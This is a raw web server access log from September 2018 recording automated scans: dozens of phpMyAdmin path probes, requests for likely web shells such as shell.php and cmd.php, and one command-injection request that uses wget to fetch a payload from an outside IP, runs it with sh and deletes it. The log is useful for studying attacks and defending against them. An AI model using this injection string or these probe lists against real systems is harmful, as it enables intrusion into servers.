IP,DATE,METHOD,URI,User Agent
"114.6.34.194","30/Sep/2018","POST","/666.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/777.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qwq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiaoma.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiaomae.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiaomar.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/data.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/log.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/fack.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/angge.php","1.0"

"114.6.34.194","30/Sep/2018","GET","/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pmd/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pma/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/PMA/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/PMA2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pmamy/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pmamy2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/mysql/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/db/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/dbadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/web/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/pma/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/PMA/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/mysql/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/mysql2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/phpmyadmin2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/mysqladmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/mysql-admin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin0/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin1/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin-4.4.0/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/myadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/myadmin2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/xampp/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyadmin_bak/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/www/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/tools/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin-old/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdminold/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin.old/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pma-old/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/claroline/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/typo3/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpma/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAbmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin__/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin+++---/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/v/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadm1n/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdm1n/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/shaAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmion/index.php","Firefox/57.0"

"189.18.216.7","30/Sep/2018","GET","/","Safari/537.36"

"66.249.70.7","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"217.128.171.65","30/Sep/2018","GET","/shell?cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo",""Gemini/2.0"

"111.231.190.181","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"111.231.190.181","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"190.102.146.26","30/Sep/2018","PROPFIND","/",""-"

"190.102.146.26","30/Sep/2018","GET","/webdav/",""Mozilla/5.0"

"190.102.146.26","30/Sep/2018","GET","/help.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/java.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/_query.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/test.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/db_cts.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/db_pma.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/logon.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/help-e.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/license.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/log.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/hell.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/pmd_online.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/x.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/shell.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/htdocs.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/desktop.ini.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/z.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/lala.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/lala-dpr.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/wpo.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/text.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/wp-config.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstik.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstik2.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstiks.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstik-dpr.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/lol.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/uploader.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmd.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmx.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmv.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmdd.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/knal.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmd.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/shell.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/appserv.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/scripts/setup.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin/scripts/db___.init.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin/scripts/db___.init.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/plugins/weathermap/editor.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cacti/plugins/weathermap/editor.php","Firefox/59.0"

